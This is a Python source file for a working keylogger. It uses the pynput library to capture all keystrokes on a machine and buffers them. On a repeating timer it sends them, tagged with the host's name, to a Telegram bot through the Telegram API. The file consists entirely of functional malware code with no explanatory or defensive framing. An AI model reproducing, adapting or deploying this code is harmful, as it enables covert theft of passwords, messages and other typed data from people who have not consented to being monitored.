#!/usr/bin/python
import pynput.keyboard, threading, requests, socket

class Keylogger:

	def __init__(self, time_interval, bot_token, chat_id):
		self.log = str("")
		self.time_interval = time_interval
		self.bot_token = bot_token
		self.chat_id = chat_id

	def telegram_bot_sendtext(self, log, bot_token, chat_id):
		msg = "From: " + socket.gethostname() + "\n\n" + log 
		send_text = "https://api.telegram.org/bot" + bot_token + "/sendMessage?chat_id=" + chat_id + "&parse_mode=Markdown&text=" + msg 
		requests.get(send_text)

	def report(self):
		self.telegram_bot_sendtext(self.log, self.bot_token, self.chat_id)
		self.log = str("")
		timer = threading.Timer(self.time_interval, self.report)
		timer.start()

	def append_to_log(self, string):
		self.log = self.log + string

	def process_key_press(self, key):

		try:
			current_key = str(key.char)
		except AttributeError:
			if key == key.space:
				current_key = " "
			elif key == key.shift:
				current_key = ""
			elif key == key.shift_r:
				current_key = ""
			elif key == key.backspace:
				current_key = ""
			elif key == key.enter:
				current_key = " "
			elif key == key.up:
				current_key = ""
			elif key == key.down:
				current_key = ""
			elif key == key.right:
				current_key = ""
			elif key == key.left:
				current_key = ""
			elif key == key.ctrl:
				current_key = ""
			elif key == key.ctrl_r:
				current_key = ""
			else:
				current_key = " " + str(key) + " "
		except UnicodeEncodeError:
			current_key = " " + "" + " "
		self.append_to_log(current_key)

		
	def start(self):           
		keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
		with keyboard_listener:
			self.report()
			keyboard_listener.join()
